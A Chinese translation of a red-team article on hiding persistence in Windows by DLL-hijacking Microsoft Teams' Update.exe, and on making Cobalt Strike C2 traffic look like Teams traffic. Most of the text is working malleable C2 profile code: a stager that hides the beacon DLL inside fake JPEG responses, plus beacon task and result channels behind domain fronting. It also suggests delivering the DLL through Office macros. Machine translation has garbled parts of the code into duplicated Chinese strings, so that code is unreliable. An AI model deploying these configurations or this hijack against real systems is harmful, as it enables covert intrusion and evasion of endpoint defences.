<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zZUfon6u18js6GyG3gtK1Q)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCbkEO8UviaQYUxvCmDMO7syWYN8Wj5Uh79koibAEPWZNmcNibNpP7M3jP7g/640?wx_fmt=png)

**介绍**  

在最近的一次操作中，我们获得了工作站的本地管理员权限，但是在该工作站上发现了 EDR 解决方案。

在这种情况下，下一步是在目标中进行绕过 EDR 维权并在系统中持续进行攻击。在探索了几个方法后，我们决定使用 DLL 劫持来进行绕过 EDR 来维权，经过分析，一个 Microsoft Teams 二进制文件被确定为容易受到 DLL Hijacking 的攻击。

本文解析了维权和 C&C 的流量如何绕过 EDR，一是利用 DLL 劫持进行维权，然后详细介绍了在使用 Cobalt Strike C2 配置文件与 C&C 通信时如何模拟合法的 Microsoft Teams 流量。

**通过 DLL 劫持持久化**
================

为了简化流程，我们准备了一个尽可能接近目标的本地环境，以进行相应的测试。之后，我们使用进程监视器来识别尝试加载不存在的 DLL 的进程。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCb2QLwXsgssMOoH39zBKvJNoYYp44MKibO6WURElFXsmjLrWRPrkrics7A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCbOhJUEufhJY2hswMX52ESDMo5icRI25kJ6iccWnbNvZ1dTBlp9GgEJOAw/640?wx_fmt=png)

发现进程 “Update.exe”（32 位）试图从可执行目录加载 “ CRYPTSP.dll ”，但未能成功，因为文件位于 C:\Windows\SysWOW64。

这意味着，如果恶意 DLL 与二进制文件位于同一目录中，则下次启动 “Update.exe” 时，该进程将首先加载该 DLL。

经过分析我们认为此可执行文件是在目标中进行维权的理想方法：

```
它是一个应用程序更新管理器 ( Squirrel )，
存在于多个产品安装中（Teams、Slack、Discord、Webex）。
在这种情况下，它是 Microsoft Teams 的一部分，它由 Microsoft 签名。
每次用户打开应用程序时都会执行它。
```

默认安装会在 Windows 注册表中设置一个 Run 键，每次用户登录时都会自动启动应用程序。

它可以与 Internet 建立常规 HTTP 连接，那么可能为我们提供一种伪装与 C&C 通信的方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCbp7PhKJejjqnCC7VPy7icjASwZc8w7jX1qXnp5b94rJ8icqXT6cnFI69A/640?wx_fmt=png)

选定目标后，我们需要实现一个执行恶意代码的 DLL（在本例中为 Cobalt Strike 负载）。

为了实现这一点，我们需要在调试二进制文件在所有导入的函数上放置断点，以检查哪些函数首先在 “CRYPTSP.dll” 中被调用。

CryptAcquireContextW() 断点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCbnNTdAXxf4iclkjkwjUCvZYjhThTERhyM20IE9QMm8kjYln20uA0WZYw/640?wx_fmt=png)

这表明这 CryptAcquireContextW()是 “Update.exe” 调用的第一个函数，因此红队开发了一个库，该库使用自定义加载程序导出此函数，该加载程序从磁盘解密并执行原始 Cobalt Strike 有效载荷（shellcode). 当然也可以使用 DLL 代理。

(译者注: 个人建议最好使用 DLL 代理)  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCbnupVc95EoODELVXFnck7nHjfnrfcw5XcHqQ2nPzOsAdqnFoloNo1fg/640?wx_fmt=png)

在这种情况下，导出的函数执行以下操作：

```
如果有效负载已执行，则使用互斥锁停止执行。
stale()函数调用来逃避一些机器学习和沙盒检查。
从磁盘检索和解密 Shellcode。
Teams.exe 执行以模仿 Update.exe 的合法行为。
通过执行的shellcode CreateFileMapping+MapViewOfFile+memcpy技术。
```

**隐藏与 C&C 的通信**  

由于环境的限制，Internet 连接只允许与 Microsoft 域进行连接，因此域前端与定制的 Cobalt Strike 配置文件一起使用。这些设置提供了一种灵活的方式来构建 HTTP 请求和响应以与 C&C 通信。

使用此功能来隐藏代理的通信，模仿 Microsoft Teams 发出的 HTTP 流量。在这种情况下，使用了分段有效载荷，它分为两部分：stager 和 stage。第一个，较小的，负责获取第二个 C&C 阶段：一个包含所有代理逻辑（Cobalt Strike 术语中的信标）的 DLL，它将被反射加载到内存中。通过使用这种类型的有效载荷，与 C&C 的通信流可以分为 3 种类型：  

```
获取 Cobalt DLL 的初始请求。
植入请求以获取任务。
植入请求以发送任务结果。
```

**Stager：获取 beacon**
--------------------

http-stager 部分定义了如何检索信标，其中 stager 请求模拟图像下载，使用 Microsoft Teams 自己的 HTTP 标头。响应似乎是合法图片，但包含信标 DLL。

为了实现这一点，我们需要使用了格式好的 JPEG 标头和尾随字节。

```
http-stager {
                set uri_x86 "/v1/objects/0-neu-d10-ccab474e582c03325f9f07ba8a3aae8a/views/imgo";
                set uri_x64 "/v1/objects/0-neu-d10-cdab424e592c03253f9f07ba8d9aae8a/views/imgo";
 client {
                header "Host""<Endpoint Azure>";
               header "x-mx-client-version""27/1.0.0.2021020410";
                header "Origin""https://teams.microsoft";
                parameter "v""1";
               }
 server {
               header "Server""Microsoft-IIS/10.0";
                header "strict-transport-security""max-age=31536000; includeSubDomains";
                header "X-Powered-By""ARR/3.0";
                header "X-Content-Type-Options""nosniff";
                header "x-ms-environment""North Europe-prod-3,_cnsVMSS-6_26";
                header "x-ms-latency""40018.2038";
                header "Timing-Allow-Origin""https://teams.microsoft.com";
                header "Access-Control-Allow-Origin""https://teams.microsoft.com";
                header "Access-Control-Allow-Credentials""true";
                header "Connection""close";
                header "Content-Type""image/jpeg";
                output {
                prepend "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xFF\xDB\x00\x43\x00";
                append "\xF9\x7C\xF3\x4E\x3F\xEC\x7F\x82\x8C\xA4\xB5\x5B\x3E\x64\x11\xE7\xEA\x78\x70\xCD\x6B\xFE\x0E\x1F\xFF\xD9";
                               print;
                              }
               }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCburJUVZmfSlAhGH39PYGV2zqJS8ugkfWiatH3drv6gl5O6t2NibdIziatQ/640?wx_fmt=png)  

这样，Wireshark 等工具会将 HTTP 响应的内容识别为 JPEG 图像。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCb3Xy04HMz4VeMU0WicBxmrH9ah4O2oRfcAFUrtick597tlbYeHFmsicjqw/640?wx_fmt=png)

**beacon 获取任务**
---------------

配置文件的以下部分用于定义 Cobalt Strike 代理要求执行新任务的定期请求格式。

这些请求使用 “events”GET 参数来发送 base64 编码的会话信息。由服务器编码的信息被嵌入到看似合法的响应中。

```
http-get {  
                set uri "/Collector/2.0/settings/"“/收集器/ 2.0 /设置/” ;；
 client {
              header "Accept"“接受” "json"“json” ;；
              header "Host"“主机” "<Endpoint Azure>"“<端点Azure >” ;；
              header "Referer"“推荐人” "https://teams.microsoft.com/_"“https://teams.microsoft.com/_” ;；
              header "x-ms-session-id"“x-ms-session-id” "f73c3186-057a-d996-3b63-b6e5de6ef20c"“f73c3186 - 057 a - d996 - 3 - b63 b6e5de6ef20c” ;；
              header "x-ms-client-type"“x-ms-client-type” "desktop"“桌面” ;；
              header "x-mx-client-version"“x-mx-client-version” "27/1.0.0.2021020410"“27/1.0.0.2021020410” ;；
              header "Accept-Encoding"“接受编码” "gzip, deflate, br"“gzip、缩小,br” ;；
              header "Origin""https://teams.microsoft.com";

             parameter "qsp""true";
              parameter "client-id""NO_AUTH";
              parameter "sdk-version""ACT-Web-JS-2.5.0&";

              metadata {
                           base64url;
                           parameter "events";
                          }
             }
 server {
              header "Content-Type""application/json; charset=utf-8";
              header "Server""Microsoft-HTTPAPI/2.0";
              header "X-Content-Type-Options""nosniff";
              header "x-ms-environment""North Europe-prod-3,_cnsVMSS-6_26";
              header "x-ms-latency""40018.2038";
              header "Access-Control-Allow-Origin""https://teams.microsoft.com";
              header "Access-Control-Allow-Credentials""true";
              header "Connection""keep-alive";
              output {
                           netbios;
                           prepend "{\"next\":\"https://westeurope-prod-3.notifications.teams.microsoft.com/users/8:orgid:a17481c3-f754-4d06-9730-4eb0be94afc3/endpoints/";
                           append "/events/poll?cursor=1613554385&epfs=srt&sca=4}";
                           print;
                          }
             }
}
```

发送命令  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCb7axJF2rXF59AfIa5HFqDBtvAHHSrv8MYBVWiczc63F9UoIZvoIVKAGg/640?wx_fmt=png)

**Beacon: 发送结果**
----------------

最后，http-post 块指定了从代理发送到 C&C 的结果请求的格式。对于此示例，输出位于 Authentication HTTP 标头内，我们伪装成 JWT 身份验证令牌。

```
http-post {
             set verb "GET";
             set uri "/users/8:orgid:b1a28-a1c3-3d54-4eb01adb1/endpoints/events/poll";

              client {
                           header "Accept""json";
                           header "Host""<Endpoint Azure>";
                           header "Referer""https://teams.microsoft.com/_";
                           header "x-ms-query-params""cursor=1613554385&epfs=srt&sca=5&activeTimeout=135";
                           header "x-ms-client-type""desktop";
                           header "x-mx-client-version""27/1.0.0.2021020410";
                           header "Accept-Encoding""gzip, deflate, br";
                           header "Origin""https://teams.microsoft";
                           output {
                                        base64;
                                        prepend "skypetoken=eyJhbGciOi";
                                        header "Authentication";
                          }
                           id {
                                        netbios;
                                        prepend "f73c3186-057a-d996-3b63-";
                                        header "x-ms-session-id";
                          }
}
              server {
                           header "Content-Type""application/json; charset=utf-8";
                           header "Server""Microsoft-HTTPAPI/2.0";
                           header "X-Content-Type-Options""nosniff";
                           header "x-ms-environment""North Europe-prod-3,_cnsVMSS-6_26";
                           header "x-ms-latency""40018.2038";
                           header "Access-Control-Allow-Origin""https://teams.microsoft.com";
                           header "Access-Control-Allow-Credentials""true";
                           header "Connection""keep-alive";

                           output \{\{
                                        netbios;
                                         prepend "{\"next\":\"https://westeurope-prod-3.notifications.teams.microsoft.com/users/8:orgid:a17481c3-f754-4d06-9730-4eb0be94afc3/endpoints/"”{\“\”:\“https://westeurope刺激- 3. notifications.teams.microsoft.com/users/8: orgid: a17481c3 f754 - 4 d06 - 9730 - 4 - eb0be94afc3 /端点/” ;；
                                        append "/events/poll?cursor=1613554385&epfs=srt&sca=4}"“光标/事件/调查? = 1613554385 &epfs = srt&sca = 4}” ;；
                                        print;
                                       }
                          }
}
```

发送结果  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBn3jthFOaYbVVOqdA5ZQCbvL32D5vho9xVLKMISJe8mYSGulstwgGZkaBAUQJmepmO4es15BHK5Q/640?wx_fmt=png)

**结论**  

本文展示了攻击者如何利用服务中的 DLL 劫持漏洞通过签名的二进制文件执行恶意代码，模仿相应合法应用程序的流量，以最大限度地减少被检测到的机会。

应该注意的是，这种技术在社会工程练习中也很有用，其中通过 Microsoft Office 宏在使用此应用程序更新管理器的任何应用程序目录中部署恶意 DLL 就足够了，而无需直接注入或执行任何有效负载。